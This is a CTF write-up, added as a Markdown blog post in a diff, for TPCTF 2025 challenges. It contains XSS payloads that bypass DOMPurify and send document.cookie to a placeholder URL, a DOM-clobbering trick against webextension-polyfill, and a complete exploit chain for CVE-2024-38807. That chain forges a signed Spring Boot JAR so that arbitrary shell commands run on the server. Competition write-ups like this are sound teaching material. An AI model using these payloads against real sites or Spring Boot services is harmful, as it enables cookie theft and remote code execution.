@@ -1,0 +1,321 @@
+---
+title: TPCTF 2025 Official Write-Up (6 challenges)
+date: 2025-03-10T22:27:27+08:00
+image: tpctf2025.png
+tags:
+-   writeup
+-   ctf
+---
+
+TPCTF 2025 official write-up for my challenges: baby/safe layout (revenge), Are you incognito, encrypted chat, and verified toolbox.
+
+<Excerpt />
+
+This is my first time to write challenges in a public CTF. Feel free to leave a comment or add a reaction below if you have unintended solutions / suggestions / anything to say.
+
+## baby layout (81 solves)
+
+One solution is to put `{{content}}` inside an attribute and to close the quote in the inner payload:
+
+```html
+<img src="{{content}}">
+```
+
+```html
+" onerror="fetch('{YOUR_URL}'+document.cookie)
+```
+
+An alternative solution is to close a `<textarea>`, like [Bad usage | Not enough context | Exploring the DOMPurify library: Hunting for Misconfigurations (2/2) | mizu.re](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#bad-usage-not-enough-context):
+
+```html
+<textarea>{{content}}</textarea>
+```
+
+```html
+<div id="</textarea><img src=x onerror=fetch('{YOUR_URL}'+document.cookie)>"></div>
+```
+
+## safe layout (50 solves)
+
+I made a mistake not banning `data` and `aria` attributes (`ALLOW_DATA_ATTR` and `ALLOW_ARIA_ATTR`)[^mizu-2], so it can be solved in the same way as the baby version by using `data-x` or `aria-x` instead of other attributes like `src`.
+
+[^mizu-2]: I created this challenge before [this blog post](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations) was published. I did notice it before the event, but apparently I did not read it very carefully :(
+
+## safe layout revenge (29 solves)
+
+Tips: You can use [Dom-Explorer](https://yeswehack.github.io/Dom-Explorer/) to see DOMPurify output. It’s a great tool for playing with mXSS and sanitizers.
+
+We need to get a malicious tag without using attributes. Normally, malicious tags will be either removed or escaped, but we can get unescaped angle brackets in `<style>`. DOMPurify is very strict and any HTML tags in `<style>` will be filtered. However, the regular expression only checks for `/<[/\w]/`, so `<{{content}}` will not be filtered and can be used to get malicious tags.
+
+Here the inner payload is used twice, first to close the `<style>` tag and then to create the `<img>` tag:
+
+```html
+a<style>{{content}}<{{content}}</style>
+```
+
+```html
+img src onerror=fetch(`{YOUR_URL}/`+document.cookie) <style></style>
+```
+
+Another solution is similar but uses an empty `{{content}}`, like [CVE-2023-48219](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#cve-2023-48219-tinymce)[^mizu-2].
+
+## Are you incognito? (3 solves)
+
+Notice that the bot runs Chromium but the extension uses `browser` instead of `chrome` to access the extension API. It uses `webextension-polyfill` to provide the API under `browser`. We can pass the check if we modify the `browser` object. We cannot directly create JavaScript variables since the web page and the content script run JavaScript separately, but we can use [DOM clobbering](https://domclob.xyz/) to do so.
+
+We need `browser.runtime.id` to pass [the check in `webextension-polyfill`](https://github.com/mozilla/webextension-polyfill/blob/6a42cbeaf637ba3f1283bdcdd657afd06454ca55/src/browser-polyfill.js#L13) and then `browser.extension.inIncognitoContext` to pass the check in the challenge:
+
+```html
+<form id="browser" name="runtime"></form>
+<form id="browser" name="extension">
+  <input name="inIncognitoContext">
+</form>
+```
+
+An alternative solution is found by USTC-NEBULA, that is to create a global variable `exports` instead of `browser.runtime.id` to pass [the check in `babel-transform-to-umd-module.js`](https://github.com/mozilla/webextension-polyfill/blob/6a42cbeaf637ba3f1283bdcdd657afd06454ca55/scripts/babel-transform-to-umd-module.js#L7).
+
+Some sites such as webhook.site use path instead of subdomain for each user and are thus unable to record the `/flag` request. You can use [requestrepo.com](https://requestrepo.com) or your own server.
+
+This appears to be a 0-day vulnerability[^webextension-polyfill], but I couldn’t find a practical way to exploit it in real-world extensions. I suspect it may at most disrupt the normal execution of content scripts without posing significant security risks or providing strong attack incentives. Anyhow, I will report this to the upstream after the competition. It’s at least a bug if not a vulnerability.
+
+[^webextension-polyfill]: The original version of this challenge was a line `const api = globalThis.browser || globalThis.chrome` instead of the library, but I thought it was too obvious and then found that `webextension-polyfill` was also vulnerable.
+
+P.S. A similar bug was once discovered and fixed in [#153](https://github.com/mozilla/webextension-polyfill/pull/153) but later introduced again in [#582](https://github.com/mozilla/webextension-polyfill/pull/582).
+
+## encrypted chat (15 solves)
+
+All senders share the same key stream, so race condition will happen if two participants send messages at the same time, before receiving the message sent from the other side, and then the key stream will be reused.
+
+So we need to locate the parts where the key is reused and then decrypt them. Since the messages are in ASCII, we can use the highest bit in each byte to find reused key. The remaining of this challenge is [this assignment in CS255](https://crypto.stanford.edu/~dabo/cs255/hw_and_proj/hw1.html).
+
+A simple approach is to XOR the messages and notice that XORing a letter with a space is to toggle its casing. So a character is likely to be a space if its XORs with others are letters. Then manually fix the broken words.
+
+Another approach is to use some language model (e.g. GPT, a small one is enough) to calculate the probability of the next character (use the internal results, not to ask an AI assistant) and apply the Viterbi algorithm. Reference: [A Natural Language Approach to Automated Cryptanalysis of Two-time Pads](https://dl.acm.org/doi/abs/10.1145/1180405.1180435). This approach is more accurate but too expensive to implement during a CTF.[^gpt-viterbi]
+
+[^gpt-viterbi]: I have actually implemented something similar before. It was able to decrypt MTP for various file types besides natural language. Specifically, it was used to decrypt the Conti ransomware.
+
+Or you can use the known plaintext `TPCTF{` as a starting point.
+
+Here’s my script with an interactive solver to fix the broken words:
+
+```python
+import json
+from base64 import b64decode, b64encode
+from string import ascii_letters
+
+def solve(ciphertexts: list[bytes]):
+    n = len(ciphertexts)
+    m = len(ciphertexts[0])
+    key = bytearray(m)
+    for i in range(m):
+        count = [0] * n
+        for j, x in enumerate(ciphertexts):
+            for k, y in enumerate(ciphertexts[:j]):
+                if chr(x[i] ^ y[i]) in ascii_letters:
+                    count[j] += 1
+                    count[k] += 1
+        key[i] = 32 ^ ciphertexts[count.index(max(count))][i]
+    plaintexts = []
+    for ciphertext in ciphertexts:
+        plaintext = bytes(c ^ k for c, k in zip(ciphertext, key))
+        plaintexts.append(b64encode(plaintext).decode())
+    print(json.dumps(plaintexts))
+
+with open('messages.txt') as f:
+    stream = b64decode(f.read())
+
+n = len(stream)
+high_bits = bytes([b >> 7 for b in stream])
+
+i = 0
+while i < n:
+    if high_bits.count(high_bits[i:i+50], i) < 5:
+        i += 1
+        continue
+    l = i + 10
+    r = i + 40
+    k = high_bits.count(high_bits[l:r], i)
+    while high_bits.count(high_bits[l-1:r], i) == k:
+        l -= 1
+    while high_bits.count(high_bits[l:r+1], i) == k:
+        r += 1
+    pattern = high_bits[l:r]
+    ciphertexts = []
+    while (p := high_bits.find(pattern, i)) != -1:
+        ciphertexts.append(stream[p:p+len(pattern)])
+        i = p + len(pattern)
+    solve(ciphertexts)
+```
+
+```html
+<!DOCTYPE html>
+
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <title>Encrypted Chat Solver</title>
+  <script src="https://unpkg.com/vue@3/dist/vue.global.prod.js"></script>
+</head>
+
+<body>
+  <div id="app">
+    <label>Input: <input v-model="input"></label>
+    <div style="font-family: monospace; font-size: 1rem; white-space: pre;">
+      <div v-for="(plaintext, i) of plaintexts" :key="i" style="margin-top: 1rem; display: flex; gap: 1px;">
+        <div v-for="(c, p) in plaintext" :key="p" @click="changeKey(i, p, c)" style="padding: 1px; cursor: pointer;">
+          <span v-if="isAsciiPrintable(c)">{{ c }}</span>
+          <span v-else style="color: red;">?</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const {createApp, ref, computed, watch} = Vue;
+
+    createApp({
+      setup() {
+        const input = ref('');
+
+        const bases = computed(() => {
+          try {
+            return JSON.parse(input.value).map((b64) => Array.from(atob(b64)));
+          } catch {
+            return [];
+          }
+        });
+
+        const key = ref([]);
+        watch(bases, (stream) => {
+          key.value = new Array(bases[0]?.length).fill(0);
+        });
+
+        const plaintexts = computed(() =>
+          bases.value.map((base) => {
+            return base.map((c, i) => String.fromCharCode(c.charCodeAt(0) ^ key.value[i]));
+          })
+        );
+
+        function isAsciiPrintable(c) {
+          return c.charCodeAt(0) >= 32 && c.charCodeAt(0) <= 126;
+        }
+
+        function changeKey(i, p, oldChar) {
+          const newChar = prompt(`Change '${oldChar}' to:`, oldChar)?.[0];
+          if (!newChar) return;
+          key.value[p] ^= plaintexts.value[i][p].charCodeAt(0) ^ newChar.charCodeAt(0);
+        }
+
+        return {
+          input,
+          plaintexts,
+          isAsciiPrintable,
+          changeKey,
+        }
+      },
+    }).mount('#app');
+  </script>
+</body>
+
+</html>
+```
+
+## verified toolbox (1 solve)
+
+It uses Spring Boot 3.3.2, so it’s [CVE-2024-38807: Signature Forgery Vulnerability in Spring Boot’s Loader](https://spring.io/security/cve-2024-38807)[^finder].
+
+[^finder]: This CVE is found by me.
+
+The vulnerability is that spring-boot-loader uses `JarInputStream` to verify the signatures but uses a custom `ZipContent` class to load the contents. They parse a ZIP file differently and may read different contents from a specially crafted JAR file. `JarInputStream` reads a JAR file from start to end, while `ZipContent` read the end of central directory record at the end first. We can construct a malicious JAR file by concatenating the bytes of two JAR files, and then adjust the offset fields in the central directory headers and the end of central directory record of the second JAR file. The signature verifier will read the first JAR file while the content loader will read the second.
+
+You can also find [the commit that fixes this vulnerability](https://github.com/spring-projects/spring-boot/commit/0b24ee857189e139f48826bf2aef10ae8680c11b) along with the `mismatched.jar` test case, and then create the malicious JAR file based on `mismatched.jar`.
+
+```bash
+#!/bin/bash
+
+set -euo pipefail
+
+url="$1"
+
+javac Tool.java
+
+jar cf exp.jar Tool.class
+
+rm -f keystore.jks
+
+keytool -genkeypair \
+    -alias exp \
+    -dname 'CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown' \
+    -keyalg DSA \
+    -keysize 2048 \
+    -validity 1 \
+    -keystore keystore.jks \
+    -storepass 133337
+
+jarsigner -keystore keystore.jks -storepass 133337 exp.jar exp
+
+curl -O "$url/toolbox/greeting.jar"
+jar xf greeting.jar
+
+python exp.py
+
+jar cf0 nested.jar inner.jar
+
+curl -F file=@nested.jar -F path=inner.jar -F input='/readflag give me the flag' "$url"/run
+```
+
+```python
+with open('hello.jar', 'rb') as f:
+    signed = f.read()
+
+with open('exp.jar', 'rb') as f:
+    exp = f.read()
+
+shift = len(signed)
+exp_list = list(exp)
+
+eocd_start = exp.rfind(b'PK\x05\x06')
+cd_offset = int.from_bytes(exp[eocd_start+16:eocd_start+20], 'little')
+new_cd_offset = (cd_offset + shift).to_bytes(4, 'little')
+exp_list[eocd_start+16:eocd_start+20] = new_cd_offset
+
+cd_start = cd_offset
+pos = cd_start
+while pos < eocd_start:
+    if exp[pos:pos+4] == b'PK\x01\x02':
+        lfh_offset = int.from_bytes(exp[pos+42:pos+46], 'little')
+        new_lfh_offset = (lfh_offset + shift).to_bytes(4, 'little')
+        exp_list[pos+42:pos+46] = new_lfh_offset
+        pos += 46
+    else:
+        pos += 1
+
+modified_exp = bytes(exp_list)
+with open('inner.jar', 'wb') as f:
+    f.write(signed)
+    f.write(modified_exp)
+```
+
+```java
+import java.io.ByteArrayOutputStream;
+
+public class Tool {
+    public static String run(String cmd) {
+        try {
+            ProcessBuilder processBuilder = new ProcessBuilder("sh", "-c", cmd);
+            Process process = processBuilder.start();
+
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            bos.write(String.format("\n$ %s\n", cmd).getBytes());
+
+            process.getInputStream().transferTo(bos);
+            process.getErrorStream().transferTo(bos);
+
+            return bos.toString();
+        } catch (Exception e) {
+            return e.getMessage();
+        }
+    }
+}
+```
